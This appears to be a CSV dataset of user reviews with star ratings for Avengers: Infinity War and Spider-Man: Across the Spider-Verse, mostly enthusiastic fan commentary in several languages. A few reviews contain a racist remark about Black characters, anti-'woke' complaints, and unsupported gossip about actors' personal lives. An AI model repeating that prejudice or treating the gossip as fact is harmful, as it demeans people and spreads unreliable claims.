This Avengers movie was really good. The plot of the movie was very good and the action scenes were awesome. Josh Brolin makes a great Thanos in this movie. The ensemble cast was fantastic as well. There were even some moments in the movie that make you wonder why these moments happened and what could happen in the next movie. That's what makes it great. Everyone will love this movie. Go see it if you haven't yet.,4
Exciting and emotional!,4
Best movie ever‚ù§‚ù§‚ù§‚ù§‚ù§‚ù§‚ù§üòéüòéüòéüòéüòéüòéüòéüòéüòé,5
An amazing movie that brings a plethora of your favourite heroes together!,4.5
In my opinion it is tied with avengers endgame for 2nd best super hero film.,5
"Had the best action of the entire MCU, it also developed the villain well.",4
"I like Infinity War, but it's my least favorite of the 4 Avengers films. Some of the fight scenes, such as Thanos vs Dr. Strange, are fantastic. Others, like the final battle, are quickly edited and overall don't have too many moments. Also, Thanos is pretty much the only good character in the film. While Thor and Dr. Strange get some decent arcs, the villain is the only great character in the film. However, my biggest problem with the film is the story. With such an ambitious setup, you would think the film has a vast story. Instead, they have a person-goes-on-a-quest-for-a-valuable-object story that happens to be on a large scale with many characters. This can be done well like in Star Wars, but this film is sadly lacking any real story elements to make the action and characters compelling. Overall, the film is just one good character and many fun fight scenes. However, the ambition and strong elements make this an overall really great film.",4
Better than Avengers: ENdgame. 10/10,5
Better than Endgame. 9.8/10,5
Years of movies finally pay off in avengers endgame. This movie is incredible!,4.5
Very good movie still better than Endgame. And with out a doubt the best MCU film. Rating: 9.7/10= 4.85 stars rounds to 5 stars.,5
Filme muito bom eu recomendo muito para que e fan ou para que s√≥ quer ver mesmo,4.5
"The way this movie manages to incorporate its massive cast is extraordinary and remains extremely engaging throughout. If I had any complain it would be the amount of screen time given to Captain America, but that is a personal thing.",4.5
"Impresive. It was amazing watching all that characters in the screen, and all of them well written :)",4.5
This movie combines all the Marvel characters very well!! Avengers Infinity War brings you fun and sad moments at the same time. It may lead you into tears and will absolutely leave you curious about the next movie!!,4
"I watched this movie without watching the old avengers movie. However, i liked it. One of the best movies in the world. Five star is fair for this movie.",5
"This seems to be aimed at Tom and Jerry fans with continuous fatal injuries not resulting in anyone actually dying. There is very little story or meaningful dialogue, and no introduction to the characters, so you have to be a fan of the series before watching.",2.5
El inicio del fin. Atrapante. Obviamente te quedas sin final hasta Endgame.,4
This is a groundbreaking superhero film in a genre over saturated with filler. Absolutely lives up to the hype that Marvel has been building up since 2008.,5
"Poignant and moving. Effectively building up to the finale. However, the character of Star Lord lacks complexity.",4
"Another Disney franchise that's gone in to over kill and they're planning more. The bubble is bursting. Just look at Star Wars. Franchise over kill. The movie itself was mildly entertaining. Containing much girl power in your face it was suffocating. According to Brie Larson, whose movies fail because they're bad movies, blamed her failings on white people. Mainly men. Wants more ethnic people critiquing her movies. So, where do white people fall into the ""ethnic"" part. It's a diverse race. It's of little wonder her co-stars couldn't stand her. (Please watch the interviews) Also used the movie as a platform to air her personal views on white men and also managed to irritate her colleagues. Look at the salaries of these actors. They have increased yet again. Example: Robert Downey Jr. Served time in prison. Possession of weed, cocaine and heroin on multiple occasion and one possession of a pistol, whilst speeding whilst under the influence of drugs. Any average person wouldn't be allowed to travel, reputation in tatters no money. Interesting. Also, if you make the smallest inference to his past during an interview he'll depart rather quickly in surprise. Fickle world.",2.5
"It's the best marvel movie so far, it's the best superhero movie.",5
"A risky movie that balances action and character development, containing one of the best Marvel villains ever.",4
"Action packed fun, with something at the end never seen before.",4
this is a really awesome movie,4.5
"Infinity war has to be one of the greatest science fiction movies of all time. Warning there could be some extreme bias in this. The movie to me didn‚Äôt seem like it would ever happen remembering back to when Thanos first appeared in 2012. Although the movie did not quite reach the hype it was built towards it is still quite the masterpiece. This movie is absolutely jam packed and to the naked eye could appear to be very mindless action filled science fiction nonsense. But in terms of superhero movies Marvel movies are very thoughtful in every piece of dialogue and interactions seen within their movies. Characters actually are complicated and interesting and not as shallow as many blockbuster movies make their characters. The complexities they exhibit allow for anyone going to the theater to identify with one of them if not all of them. Characters not only exhibit uniqueness but exhibit the very flaws that make us human. In other words they are not perfect and make mistakes that could impact others. Such as Thor‚Äôs selfishness in seeking revenge against Thanos, he cost half the universe. Or in Peter Quills grief he caused them to not get the gauntlet from Thanos. Along with the absolutely essential story Thanos is given within this film that makes this giant purple cgi being actually believable as something that thinks feels and breathes. Not only that but it is not mindless evilness that makes Thanos a villain. It is complex in that he does what he believes in his big ego he is a savior. Many could even argue he is the hero of the story. They give Thanos many facets and complexities within the already packed film and that in itself is an achievement. This movie has an enormous number of characters and every second of time a character has spent on screen is not wasted. Every section in which characters interact or a character and the reflects helps move the plot forward and it‚Äôs absolutely beautiful in the way that it accomplishes this. It fits together perfectly almost like a shirt that was baggy on you last year. That‚Äôs where this movie does struggle a little bit in that there isn‚Äôt much time to develop arcs for characters and give them development and may feel rushed. It can be so fast moving at some points it‚Äôs hard to catch a breath while watching it. Most of the film despite this does a pretty good job of developing characters and relieves the pressure of a jam packed film with comedy. It ends on a perfect note that either leaves the audience devastated or seeking more or both. Every little bit of this film connects and interacts with one another making a beautifully done story and action sci-fi film.",4.5
"A super fun action packed movie that should be clustered and has ideas that would be difficult to pull off but it has one of the finest executions in MCU history, 10/10.",5
"Berger than Endgame. And it has less %. God, people have bad taste.",5
"This movie portrays a villain that by far has been the best out of all the other Marvel antagonists. It shows his personal conflicts, his purpose, as well as his cruelty. The heroes of this film are overshadowed by this, but the ending really makes a mark on the audience.",5
"This movie is damn near perfect. The visuals, the story, the soundtrack, the heroes, the villain, the action and the ending are easily one of the best of the MCU. The fact that this movie manages to pull this off is unbelievable and to see Marvel give us this dark ending where all our are left alone and broken was so unexpected. This is by far the best MCU movie and one of my favorites cause everything works and there is not a single moment when I felt bored.",5
"Great plot. Great execution. Great villain, but if you aren't entirely invested in Marvel you may be very confused and cringe at how some things came to be.",4
"It was enjoyable as I watched, and a lot better than I thought it would be. I had just seen Wonder Woman, so I wasn't expecting much. YES, i know they are different universes, but WW left such a bad taste in my mouth. The only problem is that The Avengers are really dumb, all of them. They can't figure out any sort of plan at all. And, SPOILER ALERT, they give Thanos exactly what he wants, basically handing him gems he's searching for. When anyone suggests that they hide, run, try to figure out a plan, or do anything pro-active, they all have some mumbly sort of excuse why they shouldn't. So, they basically just do stupid things to continue the plot. I wish the writers took a little more time to construct a plot in which the heroes at least tried to use their minds. They had me rooting for Thanos. After 40 minutes of The Avengers' Three Stooges imitations, I really saw Thanos' point of view. Besides that, its a fun romp around Universe.",3
"Infinity War is a visually stunning movie. The CGI is really realistic as well as impressive(especially the battle on Titan). The story is good in its own way, with Thanos proving to be a memorable villain. And the huge ensemble of casts does a great job, although it's a bit overwhelming. I don't like open endings, but with this movie, I think I can make an exception.",4
Infinity War is one of the greatest Marvel crossover I've ever seen. Sad that half of the universe got integrated.,4.5
An amazing 1st half to a 2 part story. The Russo brothers pulled off the impossible task of juggling all the MCUs heroes while fleshing out Thanos' character.,5
My favorite movie out of the MCU.,5
What was a fantastic viewing experience initially has been soured by Endgame failing to pay off what this film sets up.,4
Incre√≠blemente trepidante no te deja moverte de tu asiento excelente,5
it's so good and awesome,5
The MCU takes a turn from its light hearted-ness while still having that humor the MCU has become known for. The hopelessness you feel for each of these beloved characters is the perfect setup for Endgame.,5
"My personal favourite MCU movie to be made, infinity war shows that the russo brothers really can step it up and give us a drak hopeless look on a franchise that used to be filled with only the good. Truly a crushing story that brings out the best in everyone onscreen especially RDJ. The CGI is next level and Thanos is the best villain this franchise will ever have with intriguing morals and a great story fueling his mission.",4
Better than Endgame.,5
The MCU just gave us one of the best villain of the decade.,4.5
An amazing piece of special effects and the beginning to the end of the MCU,5
A pointless movie. Just a set up for endgame,1
it was like a fancy montage of shots,2.5
Best marvel movie of all time!,5
Be careful- this one makes you cry üò≠,4.5
What a incredible movie screenplay visualization action scenes script villian characterization everything is fantastic speechless,5
This movie is just a good movie. The humor was boring and I got sick of it fast and I was not impressed by this movie.,3
Avengers movies have not disappointed me yet! Very entertaining!,5
"Good action scenes at the end, but the first hour was a waste",3.5
Hands down the best MCU movie,5
Another great installment in the Marvel Universe,4
"Some of the most fun I've had watching a movie in theaters, left feeling nothing short of absolutely satisfied. A great first part to the end of the MCU so far.",5
This movie just puts a smile on my face.,5
"Best Marvel movie, great villain and great cast with an unexpected turn of events. Fantastic seeing everyone come together and exploring the dynamics that take place. Thor and Thanos alone make this movie worth seeing!",5
Was able to watch this movie 6 times in theaters despite its lengthy build up just to bring all stones together. Best part was the ending watching half the heroes die.,3.5
"Fast paced, emotional, and surprisingly light-hearted at times, Avengers: Infinity War balances a massive cast with finesse by paying tribute to every film that led to its creation. (A-)",4.5
"Pretty dang solid movie. Lots to like, lots to love, and not much to hate.",4.5
"I truly enjoyed the 10 year lead up to this movie, absolutely epic movie! Thanos is the best villain since Darth Vader!",5
Absolutely amazing! You will not be disappointed,5
"Perfectly Balanced. As any Ensemble movie should be. Infinity war is an excellent movie. The heroes are built upon wonderfully and are each given excellent character building moments. But the real star of this film is Thanos. This film builds up the mad Titan as a universal threat. You can make the argument that this is a Thanos movie more than anything else. Josh Brolin delivers a deliciously imposing performance, competing with Michael B Jordan for best MCU villain. It's an excellent blockbuster. The perfect avengers movie that sets up the grand finale in the best possible way.",5
I was blown away by this movie!,5
Honestly the more I think about it the more I realize that this movie is more enjoyable than Endgame if I'm being honest with you.,3
Hands Down One of the greatest movie's of all time Avengers Infinity War is Freaking EPIC!! From the amazing build up to the amazing action sequences Infinity War is Amazing the whole time. Thanos is the best MCU villain and it has one of the most shocking endings ever.,5
"Loss, revenge, and sacrifice seemed to be the main theme of the Infinity War. Even though there was occasional humor inserted into the movie, the emotions that the characters had experienced made the movie much gloomy and dark.",4.5
"The movie leaves you both absolutely happy and desperate for more, and hopes for the best for all the remaining Avengers.",4.5
"Thanos was so good that there were times I questioned if he really was the villain in the entire movie. Considering what is happening right now in the world, sometimes, you will think that maybe he was right all along.",4
"One of the best crossovers I've seen in movie history. Never before that a lot of Marvel characters will be present in it, with tones varying from being easy-going Guardians of the Galaxy to a more serious one in Doctor Strange.",5
PURE EPIC MADNESS! Thanos' quest to find all the Infinity Stones and his mission was what made him a greater villain than any other from the past Marvel movies.,4.5
"Thanos was on a mission, and it was a terrifying one. The way Josh Brolin carried the Thanos character made the movie very awesome.",4.5
"This is a lot to take in one sitting. This movie was so jam-packed with story, dialogue, and events that calling it a movie might be an understatement.",4.5
Death flags everywhere. The Russo brothers did a great job of making this movie a great one.,4.5
"The crossover no one expected but everyone loved. Honestly, what made this movie truly spectacular and unique was the writing and the pacing which will keep you wanting more.",4
"Relying too heavily on the CGI wow factor, the movie's plot is typical and lacks surprises. The movie should have been called Iron Man IV: Infinity War as the entire movie centers around Tony Stark, my absolute least favorite Avenger. While punctuated with cute one-liners and star powered action scenes, the movie falls flat on delivery and stands as a lackluster finale to the Avengers Saga thus far.",3
Epic and thrilling it rarely gets much better than this. avengers infinity war might be my favorite film of 2018 its absolutely incredible.,5
I absolutely loved it!,4.5
A package of everything,4.5
"Deliverd the movie what fans always wanted. Great scenary, action, characters and hyping scenes with an unexpected, shocking and great written ending.",4.5
"Epic, extremely entertaining, an impressive narrative and with the darkest end of the MCU, the most risky movie in this universe, is what makes Infinity war one of the best deliveries of this universe, with a villain spectacular and bringing everyone together the characters in this great film.",5
More of the same Marvel formula.,0.5
The Avengers and the Guardians of the Galaxy team up in a attempt to stop Thanos from earning all six colorful Infinity Stones!,4.5
Probably the most beautiful and well done movie out of the MCU universe and the characters in this movie (There's alot) are all amazing and have been building up this storyline and it is all worth it.,5
"Really cool movie! Perfect for the family, great acting and action! Lots of small cheesy filler. I know others like this but its not my thing. Other than that great movie!",4
"Infinity War went above my expectations. I thought it would be more mediocre, but in the end, I can say that the whole movie was breathtaking and definitely lived up to its hype.",4.5
"This movie has clearly a much darker tone than the previous ones, but that is what makes it more special. Really cool action scenes with occasional humor made it stand out more.",4
"Excellent film! The Russo brothers really did a great job in making this movie, an epic conclusion to the first decade of MCU.",4.5
"Avengers: Infinity War was clearly much better than Avengers: Endgame in the sense that 1) it was better in terms of writing, 2) it is the true culmination of an entire decade of MCU films, and 3) Endgame gave me more questions than answers.",3.5
"GOOSEBUMPS! Infinity War is worth watching. The usual comedic banter between the casts, the awesome CGI, amazing plotline, the results did not disappoint.",5
"The character development for Thanos was so good that it made me think that maybe he was right. He was the villain that surpassed all the other villains from the past Marvel movies. Trust me, this is the movie that might have changed the MCU.",5
It is unlike anything ever done in the history of cinema. This one is masterfully woven from the culmination of Marvel movies throughout the years. Truly amazing!,4.5
"Infinity War is structured like a war movie. Not in vain a movie buff Peter Parker (Spiderman) speaks of Alien, and precisely Aliens, of James Cameron, much resembles this one of Avengers. It has no respite and the battles happen, but they are so well choreographed, they follow an order and they are not mere blows and kicks: the melee fight makes sense. And the 149 minutes are spent as if it were a short film.",4
"Here we are 10 years later with one of the most anticipated movies of all time! The CGI was much better, the story was better...everything about the Infinity War was great!",4
"This is a blast of a Marvel movie and I can't wait to see what will happen next. You are clueless and you don't know what will happen, keeping us all on the edge of our seats. Fascinating!",4
Josh Brolin portrayed Thanos really beautiful. He was an amazing villain that kept all the Avengers on their edge and made them think it was a bit hopeless to really go against him.,5
"Just like the first film, the story is full of surprises and the visuals are amazing. I really enjoyed this movie, but wished it lasted longer, however, that's only because I'm wanting to see what happens next!! Can't wait for the next film.",4
One of the best movies oat,5
I finally watched this movie! OMG! I think that it is the BEST FILM OF THE YEAR! I enjoyed every moment of it! Every frame deserves to be placed in an art gallery. It is a Masterpiece! This movie deserves to win many Oscars! I am looking forward to watching 'Spider-Man: Beyond the Spiderverse'.,5
"The animation is great, and the film sets up Beyond (the spiderverse) perfectly. The introduction to new characters is great, and let me just say, this is how you set up threequel. This is easily the most impressive animated movie I've ever seen. At first, the film feels overstuffed with plot and characters, but the more the film progresses, the better it gets!",4.5
"Five stars doesn't seem to cut it. So so good. Far better than I hoped for the sequel to a great film. So much fan service but in the best possible way. The perfect film for both nerds and those who just want something funny, clever, and visually stunning, to watch. Has everything you could want and so much more. Robie is also such a fun addition.",5
the animation is Phenomenal,5
"Sony return with the next chapter of their exceptional aminated 'Spider-Verse' franchise in 'Spider-Man: Across the Spider-Verse'. SYNOPSIS: 'Miles Morales catapults across the Multiverse, where he encounters a team of Spider-People charged with protecting its very existence. When the heroes clash on how to handle a new threat, Miles must redefine what it means to be a hero.' 'Spider-Man: Across the Spider-Verse' is the absolute perfect sequel in this franchise and continues to go full tilt into the comic book zaniness of this world. This is why fans love Marvel and the worlds within it. The extraordinary animation, which looks like it's straight off the pages of a modern day comicbook, absolutely sucks to you into this multi-coloured, kaleidoscopic world. Sony has created one of the most enjoyable and engrossing films of 2023, even though I don't think it fully reaches the heights of its predecessor. A dream for my eyes! 8/10",4
Funny villain hole guy,5
"Not worth the time, sadly.",1
"A fun movie that's great for a character study but spends a lot of time setting up cool ideas and either not delivering on them, or when they do. It falls flat. Maybe most of my criticism will be solved in Part 2 but for now, not all of it works for me.",3
"LOVED, its one of the best movies every",5
"many forgettable, wasted, filler characters (and not that interesting) very long and boring movie, predictable, boring, and not interesting enough story",0.5
Interesting movie kept my attention but not enough Peter porker and too many different characters to keep track of.,3.5
Not enough Petter porker but otherwise a few to many black people for my liking good movie tho,3.5
"First, I'm proud to be Puerto Rican, just like Miles Morales. Second, ""Into,"" ""Across"" and ""Beyond"" the Spider-Verse are Marvel's The Dark Knight Trilogy. Especially if ""Beyond"" somehow brings these characters into the live-action ""Home,"" ""Amazing"" and Original universes. Which is probably why Beyond is called Beyond the Spider-Verse. What an awesome cinematic universe Sony has created with the little that they had to work with!",5
"This film is an absolute delight in every sense. The visuals, stunning, the story, a bit predictable at times but a classic, the score, don't even get me started. Even if you haven't seen ""Into the Spiderverse"" you will enjoy this film.",5
Esse filme √© incr√≠vel! Ele parece uma hist√≥ria em quadrinhos em formato de filme. √â a defini√ß√£o perfeita de como fazer um filme sobre o multiverso. Mal posso esperar pela parte 2!,5
"This movie shows a lot of visuals and funny, sad moments. It gives the best thing a movie can do. I wish more movies can learn like this and be amazing",5
this movie was in a class of its own from spectacular characters and visuals to excellent storytelling and world building not to mention an amazing performance by Oscar Isaac as spider man 2099 proving that the spider verse movies are definitely some of the best films of all time,5
"Great sequel. If you like or loved the first one, can't see how you won't like or love this one. The first one is slightly better to me but that's just me.",4
"I liked the first movie, but this one is not very good. It's about 10 minutes of plot and 2 hours of style that somehow manages to end with a cliffhanger even though the story could easily have been finished in a 90 minute span (and probably much less). It looks very cool, but I found it tedious. Miles and Gwen deserved better.",2.5
"FUCKING SHIT ASS MOVIE WASNTED TWO HOURS OF MY LIFE, DO NOT EVEN BOTHER TO WATCH LEGIT JUST WAIT FOR THE NEXT ONE THEN WATCH THIS ONE. WASTED 2 AND A HALF HOURS OF MY LIFE WHEN I COULDVE HAVE STUDIED. IF I FUCKING FAIL MY IGVSES IM SUING THIS COMPANY.",0.5
"What can I say, just what can I say",5
"The first movie was incredible and this movie somehow is even better. From the amazing story and voice acting to the visually stunning animation and great soundtrack, Across the spider verse is a movie that left me speechless and just stunned with how good it is. This movie is for anyone who is a Spider-Man fan and I highly recommend.",5
"Spider- Man: Across the Spider- Verse es un espect√°culo con animaci√≥n de gran escala, un buen mensaje y fan service que no se siente forzado.",4.5
"Excelente, filme maravilhoso ansioso pelo pr√≥ximo.",5
I really had no idea it would be so good really enjoyed wouldn't have mined if it was four hours long but will have to just wait until it comes out again.,5
"This is only half a movie, ending with an inexcusable ""to be continued"" title card. For sure, plenty of other films have split their plots in two, but rarely do they so blatantly end on a mid-scene cliffhanger. It's too bad, because otherwise the themes of the film‚Äîof identity, self-agency, and love‚Äîare all extremely powerful. As is the terrific diversity of the cast, led by the biracial Miles. I by no means hated it; I was just very disappointed.",0.5
"Eu nem sei como conseguiu ser melhor que o primeiro, muito foda!, s√©rio, isso √© incr√≠vel!",5
hobie brown sexy #mustwatch,5
An absolute masterpiece that improves on its already perfect predecessor.,5
Goodüëç very goodüëç extremely goodüëç,5
"This movie took everything that was great about the first one and ramped it up. The visuals feel unique for every different universe, as well as many new characters getting their own styles as well. With incredible story telling, themes, action scenes, music, and especially animation, this movie is one the biggest breakthroughs in animation history.",5
Buenisima obra maestra pero la mancha deberia haber tenia un poco mas de participacion pero buenisima.,4.5
Wow!!!!! This was better than the last!!!,5
"I was worried when I first starting watching it that is was not going to live up to how great the last movie was. But it really pulled it together and I think may be better than the previous film, and is now one of my favorite movies.",5
Ooooooh man! This is a MUST SEE,5
"Great story, action packed, great animation, funny, sad, great characters - the best superhero movie ever made? Maybe!",5
"is the best movie I see since I'm a child, I love how you capture yourself in the film üíï",5
"Fabulous movie. And this movie is the reason why miles became my second favourite Spidey the complex situations,the betrayal from the people he loves and trust and dilemmas he faces makes his character and story so interesting and complex and he unlike most superheroes is not idealistic and moral high horse idiot and his love for his father is so touching. There is saying a hero will sacrifice u to save the world while the villains will end it for your sake and miles is such a beautiful balance between these two things. He will try his best to protect and be superhero but he won't just toss away his loved one his own damn father for random strangers whom he barely knows and that makes him so human character and one of my favourite in Marvel universe. Thank a lot to everyone who worked for this movie.",5
good shet g keep it up,5
Not much of a fun for this animated movie. Too coloful and very confusing. Almost all the fighting scenes were very fast and tiring to follow. I preferred that they made a live action with miles morales that an animated movie.,2
"This is how you do a sequel! Studio's Take notes. You go Big or you go home, add more lovable characters, more awesome scores, and a villian with a smart connection to the first and BEAUTIFUL ANIMATION! This was very suspenseful for PG movie and It has so much rewatch value!",5
Maldita sea esto podr√≠a ser un antes y despu√©s en la animaci√≥n y si no lo es creo que nos da una propuesta visual bastante interesante.,4.5
plot wise nothing actually happened,2.5
Just short of perfect.,4.5
"Esta pelicula es espectacular la animaci√≥n, historia y desarrollo es de lo mejor que llevamos de a√±o espero que este a√±o se haga con la estatuilla dorada 10/10 This movie is spectacular, the animation, story and development is one of the best things we've had this year. I hope this year it wins the golden statuette.",5
"A must see !!! The spot may be the best villain I have seen in an animated movie, the animation is wonderfully diverse and definitely set a new standard for animation ( puss and boots 2, TMNT mutant mayhem) the character arcs through the roof. It is an all around awesome movie full of spiders",5
"Spider-Man: Across The Spider-Verse is neck to neck with Elemental for the most beautiful animation of the summer, helped even more by having an incredible story, breathtaking action sequences, and massive plot twists that will leave your jaw on the floor.",5
"A genius movie lightyears far from comic book cliches continuing and deepening the Spider-Verse story, giving us a powerful and even more comic like rendition of how hard Miles's life is, incorporating so many art styles all at once.",5
"Feels like it was written by committee, and trying to check off as many ""diversity"" boxes as possible. The humor felt forced. And it felt repetitive given the prior movie's existence. Couldn't even finish it.",0.5
"Spider- Woke The film maintains the visual and action quality of the first film. However, it is another Super Hero who is kidnapped by the Woke agenda and forces us to see, in a work so beloved by true comic fans, the sealing. This film is much more dedicated to Spider Woman than Spider-Man. Countless attacks on capitalism, the use of ethnicity and racial color to once again humiliate and transform Whites as villains. It's unfortunate that this continues to happen and won't stop anytime soon! Spider- Woke O filme mant√©m a qualidade visual e de a√ß√£o que o primeiro filme. Por√©m √© mais um Super Her√≥i que √© sequestrado pela agenda Woke e nos for√ßa a ver, numa obra t√£o querida pelos verdadeiros f√£s de quadrinhos, a lacra√ß√£o. Esse filme √© muito mais dedicado a Spider Woman, do que Spider- Man. In√∫meros ataques ao capitalismo, o uso da etnia e da cor racial para novamente humilhar e transformar os Brancos como vil√µes. Lament√°vel que isso continua acontecendo e n√£o vai parar t√£o cedo!",3
"It was terrible! I couldnt stop crying, then laughing, then crying again, then laughing again and again in a loop. Untill the end. So I guess it was good ! 5 stars",5
Worst Spider-Man movie I've seen in years the plot armour for my miles thousands of Spider-Man miles some how gets away the writers sure are the worst of the worst the first movie was 1 million times better don't waste your money on it I will say other than that writing for Gwen was 8/10 but that was all pulled outta the comics basically overall holding up to the expectations from the first one this one is underwhelming on every level,0.5
"While the animation and soundtrack are iconic, Across the Spiderverse is pathetically weighted with nerdisms that drown the story. The overfocus on ""cannon events"" reduce this movie to a bloated, overdramatic comicbook conversation. The long runtime and cliffhanger ending only add insult to injury. I was so glad when it finally was over.",1.5
funny and comedy movie suitable for kids and adults,5
Spectacular movie lots of action if your into that. Only things I didn't like was it felt like a fight was every two seconds and the fact it ended on a cliffhanger. Other then that glad I watched it,3.5
Great movie! I love all the Spideys!!,4.5
"I loved the first one so much and hoped for this one to be just as good. It's visually stunning but can feel kind of intense sometimes, almost over animated. I also think it dragged on for too long and I'm personally a bit tired of the meta-verse plots in movies, but this one was interesting enough. First one is still my favorite tho.",3.5
Pretty good overall I love the easter eggs,4.5
"there are definitely better spider-man movies, i get that the animation was the special thing about it, was that great for me personally",2.5
"There's not a single thing in this movie that I didn't love it! It's magestic and wonderful. You should definitely see, especially if you already love the spiderhead! The animation It's outstanding and beautiful such as the first film, but with some improvements.",5
This movie really left me hanging...,4
"Filme muito bom, a hist√≥ria, seu desenvolvimento, anima√ß√µes, efeitos especiais muito bons e trilha sonora, recomendo",5
You will not be disappointed!!! And I'm telling the truth!!!!,5
"Very good half-movie, therefore I give it 5 half-stars. I would gladly pay half-price at the ticket office for Marvel's half-done homework. I'll give out the rest of the half-stars when it's done. Seriously, Marvel, stop ruining good stories to milk them throughout several releases.",2.5
A must watch Spider-Man movie beautifully done so much going on you have to watch more then once,4.5
dont know how else this could possibly be rated just look at how incredible it looks,5
"The film loses a lot with its structure and with how epic in scope they wanted everything to be. It overcomplicates a story that, by its nature, is already a bit complicated. The film is basically putting all its bets in a hoemrun; it accomplishes a line drive, but throws out its arm in the process. Is that a bad thing? Is it bad that it succeeded? Given its pedigree, it feels like it. Something about the first Spiderverse film was so special. It really treasured Spiderman as a concept, but desperately tried to be its own thing, and did fantastically in the process. This film has that same reverence, but is trying to hard to capture lightning in a bottle, that is misses its shot. It's so hard to describe it all, because the film is SO talented; it's so beautiful in terms of animation, so diverse, and so referential, and also so unique at the same time. But it's the struggle of trying to hard. You can tell when something is trying hard to be something else. And unfortunately, that's the only thing holding it back.",4
Looks like a Oscar winning movie. Better than the first. Cool action scenes. Also it has the most awesome plot twist.,5
"a really really good animation! the plot is full of twists, every single frame is a work of art, the soundtrack is amazing!, for who is buggest fan of spider man this film is it's a park of funny because is full a references and the movie deals about complex things, like... free will and pre destination. Miguel Ohara is basicaly the personification of the fan base who hate Miles morales because of the simple reason that he is black serving as a metalanguge and getting the movie more rich. ha! yeah! yeah! i forgot, the movie tell your story with the colors too showing the fellings of the caracters with the colors that make up scene.",5
All versions of Spiderman are incredible and the combination of designs are the most famous thing I've ever seen.,5
"Wow. Just wow. I have no words. This movie is the greatest piece of fiction I've ever had the pleasure of watching, and I 100% mean that when I say it. The story, animation, characters, soundtrack, emotion, it's all so breathtaking. I loved the first film so I obviously had high expectations for the sequel but my God, it still blew me away. This film is a must watch. Loved every second of this masterpiece. Already a modern classic, greatest animated movie ever put to screens, best superhero movie, and the best movie ever period. Absolutely phenomenal. Can't wait for Beyond the Spider Verse. This movie is art and needs to be seen to be believed.",5
"Film stupendo. Innovativo , e graficamente meraviglioso. Bellissimo",5
"Across The Spider-Verse takes what made the original such an absolute masterpiece and levels it up by a thousand percent. Once again, it matches it's incredibly colorful animation with a story as super as it's characters. The animation in this movie is so breathtakingly better than the first that it almost seems like a dream. The story is as good as the first, with tons of action, emotional beats that really hit, and a conclusion that leaves you in suspense for the next film, while also not making it seem like half of a movie. Overall 10/10, just like the first one, this is a perfect film.",5
Absolutely solid story all the way through. AMAZING animation as has become expected of this series. Can't wait for the sequel!,5
Great comic action movie,4.5
"The animation is a little too much, it got me stressed at some moments. Overall, good movie.",3.5
"Second part of the big-screen animated Miles Morales adventures is as bold narratively as it is visually. From the perspective of the origins of animated movies in the 20th century and its simple fables of friendship and love it would seem nigh incomprehensible how a superhero action flick could deftly and with great subtlety explore such complicated themes as cultural heritage of immigration, societal expectations and forms of opposition that they generate or even police brutality. Animated movies often tackle themes of, say, personal identity or inner conflict, but rarely with such acuteness. This is most probably the result of the evolution of public discourse (mostly in United States) with its ever-changing concepts and balance of power. This movie is very much a product of the modern American cultural climate, but it gracefully rises to the challenge of the modern complexity where so many other fail to do so (""Falcon and the Winter Soldier"" comes to mind). Plus, it is also unabashedly spectacular to look at (as if this weren't its main selling point...) and its action sequences, of which it is chock-full, managed to captivate me each and every time. Somehow this movie knows how not be boring, a thing that so many modern superhero films seem to have forgotten. Here's hopping that the final instalment be as good as the first two.",4.5
Perfect! But the cliffhanger will make you angry.,4.5
"I loved the action, romance, comedy and epic begining to an awesome cliffhanger. My favorite movie of all time.",5
"This movie (and its previous installment) made me realize Spider-Man movies should have always been animated features. I was really hyped for this one and it didn't disappoint. Many regard it as an animated super-hero movie, but I found Across the Spider-Verse as a coming-of-age tale. Like Greta Gerwig's Lady Bird, where the main character has a love interest, the real love story here is not between Miles Morales and Gwen Stacy, but between Miles and his parents ‚Äì and that's the most beautiful thing about Across the Spider-Verse. In terms of ideas, it features some very complex ones (the concept of multiverse, the concept of chain reaction, the concept of interference in time and future dimensions), but it succeeds in its execution, not only because these ideas are well-explored in the script, but also because of the direction of Joaquim dos Santos, Kemp Powers and Justin K. A very well written movie, better than many award-winning ones in this department, and it has incredible visuals to match and a dope score that also features amazing tunes. It's a world of many colors, with perfectly stylized characters that recall their own different worlds and backgrounds (with Spider-Woman/Gwen Stacy's world winning the title of ""the most beautiful world"" thanks to its amazing use of colors) and the ensemble voice cast delivers without any false note. An engaging plotline makes the audience go deep dive in the multiple Spider-Man worlds and the final plot twist will leave you really looking for the next chapter of this story. It might well end-up as my favorite film of the year (it is, so far).",5
"Para mim um filme, bem animado, mas muito viajado apenas um tendencia pasageira que pode afetar a historia e tende h√° estragar a propria imagem!",2.5
nice and adventurous movie,5
"Contra todas as probabilidades, Homem-Aranha: Do outro lado do Aranhaverso √© ainda melhor do que seu antecessor, reivindicando com credibilidade uma das mais fortes entradas de quadrinhos de todos os tempos. N√£o h√° necessidade de um asterisco limitando-o apenas √† categoria de anima√ß√£o.",4.5
Its incredible movie I ever show carrying the concept of multiverse and superhero category.,5
Amazing from start to finish,5
super secuela quedo esperando la segunda parte con ansias en dise√±o de personajes me dejo con la boca abierta los colores los fondos es demasiado par apl√≠cala,5
"The multiverse isn't my favorite concept, but across the spiderverse is full of action and the addition of characters that keeps you involved.",3.5
This movie has a bit of everything Spider Man. My son LOVED it. Adults will be engaged and enterained too. Well done!,5
"Amazingly imaginative and beautiful sequel. The animation is stunning again, and the powerful story packs family punch.",5
Overall just boring. Tried and couldn't get into it,0.5
"Spider-Man: Across the Spider-Verse is a film about finding your place in the world (or worlds if you subscribe to the multiverse interpretation of quantum mechanics üòâ) and writing your own story. A far more daring, ambitious, and vibrant masterpiece in storytelling and animation than its predecessor. Score: 9.5/10 Check out my full review here! andreusjh99.github.io/film/review/2023/06/10/review-across-the-spider-verse.html",5
Builds on the first movie's great design with a new story that keeps you engaged right up until the end. Can't wait for the next movie to finish off the adventure!,5
"Movie was amazing, from start to finish! Loved seeing the different Spiderman's in different universes. One of my favorite movies in the franchise.",5
"Improves upon the original in almost every way. From the animation, the story, the action, and the dialogue, this movie manages to execute all of these things flawlessly. However, the movies ending feels rather abrupt, as if the movie ends in the middle. Despite this slight hiccup, the movie is almost perfect and I absolutely recommend you watch it. One of the best spider-man films to come out in a long time and it is honestly a miracle that this movie is as good as it is.",4.5
9yr old son said it was amazing.,5
"yikes; i REALLY loved the first one, but this one just wasn't it for me. it was entirely too long & a lot of the animation made my eyes go buggy; made it hard to watch/stay focused. i'm not even sure i'll watch the 3rd one now when it comes out.",2
"This was a beautiful movie! Story line reels you in, and the art is phenomenal!",5
"Est√° pel√≠cula es una obra de arte, es de mis top 3 pel√≠culas favoritas para no decir que mi favorita",5
